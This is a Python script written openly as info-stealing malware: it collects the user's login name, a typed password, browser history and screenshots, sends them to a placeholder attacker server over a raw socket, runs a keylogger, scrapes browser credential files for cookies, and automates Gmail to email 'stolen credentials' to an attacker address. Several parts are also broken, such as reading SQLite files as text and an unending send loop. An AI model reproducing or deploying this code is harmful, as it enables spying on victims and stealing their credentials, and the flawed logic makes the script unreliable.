import os
import shutil
import getpass
import time
import pyautogui
import keyboard
import socket
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def gather_data():
    data = {}
    data['username'] = os.getlogin()
    data['password'] = getpass.getpass()
    data['browsing_history'] = []
    for browser in ['Chrome', 'Firefox', 'Edge']:
        try:
            profile_path = shutil.which(browser)
            data['browsing_history'].append(get_browsing_history(browser))
        except Exception as e:
            pass
    data['screenshots'] = []
    for i in range(5):
        screenshot = pyautogui.screenshot()
        data['screenshots'].append(screenshot)
    return data

def get_browsing_history(browser):
    if browser == 'Chrome':
        chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        history_file = os.path.join(chrome_path, 'Default', 'History')
        with open(history_file, 'r') as f:
            lines = f.readlines()
        urls = []
        for line in lines:
            if 'http' in line:
                urls.append(line.split()[1])
        return urls

def send_data(data, server_ip, server_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            s.sendall(str(data).encode())
            time.sleep(5)
            s.close()
        except Exception as e:
            print('Failed to send data. Retrying...')

def keylogger():
    while True:
        log = keyboard.read_key()
        if log == 'ctrl+alt+delete':
            break
        else:
            with open('keylog.txt', 'a') as f:
                f.write(log)

def steal_credentials():
    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    firefox_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
    edge_path = os.path.join(os.environ['PROGRAMW6432'], 'Microsoft', 'Edge', 'User Data')

    for path in [chrome_path, firefox_path, edge_path]:
        try:
            for dirpath, dirnames, filenames in os.walk(path):
                for filename in filenames:
                    if 'Login Data' in filename:
                        file_path = os.path.join(dirpath, filename)
                        with open(file_path, 'r') as f:
                            lines = f.readlines()
                        cookies = []
                        for line in lines:
                            if 'cookie' in line:
                                cookie = line.split('=')[1].strip()
                                cookies.append(cookie)

                        if 'chrome' in file_path.lower():
                            driver = webdriver.Chrome()
                        elif 'firefox' in file_path.lower():
                            driver = webdriver.Firefox()
                        elif 'edge' in file_path.lower():
                            driver = webdriver.Edge()
                        else:
                            continue

                        driver.get('https://www.google.com')
                        for cookie in cookies:
                            driver.add_cookie({'name': cookie.split('=')[0], 'value': cookie.split('=')[1]})

                        time.sleep(5)
                        driver.get('https://www.gmail.com')
                        time.sleep(5)
                        email = driver.find_element_by_name('identifier')
                        email.send_keys(getpass.getpass('Enter Gmail email address: '))
                        next_button = driver.find_element_by_id('identifierNext')
                        next_button.click()
                        time.sleep(5)

                        password = driver.find_element_by_name('password')
                        password.send_keys(getpass.getpass('Enter Gmail password: '))
                        next_button = driver.find_element_by_id('passwordNext')
                        next_button.click()

                        time.sleep(10)
                        # perform actions with the stolen credentials
                        # for example, send an email to the attacker's email address
                        composing_email = driver.find_element_by_css_selector('div[gh="mtb"]')
                        composing_email.click()
                        time.sleep(2)

                        to_field = driver.find_element_by_name('to')
                        to_field.send_keys('attacker_email@example.com')
                        time.sleep(1)

                        subject_field = driver.find_element_by_name('subjectbox')
                        subject_field.send_keys('Stolen credentials')
                        time.sleep(1)

                        message_field = driver.find_element_by_css_selector('div[aria-label="Message Body"]')
                        message_field.send_keys('Here are the stolen credentials:\n\nEmail: {}\nPassword: {}\n\n'.format(data['username'], data['password']))
                        time.sleep(1)

                        send_button = driver.find_element_by_css_selector('div[gh="send"]')
                        send_button.click()
                        time.sleep(5)

                        driver.quit()
        except Exception as e:
            print('Failed to steal credentials from {}'.format(path))

if __name__ == '__main__':
    virus_data = gather_data()
    send_data(virus_data, 'attacker_server_ip', 12345)  # Replace 'attacker_server_ip' with your server IP and 12345 with your server port
    keylogger()
    steal_credentials()
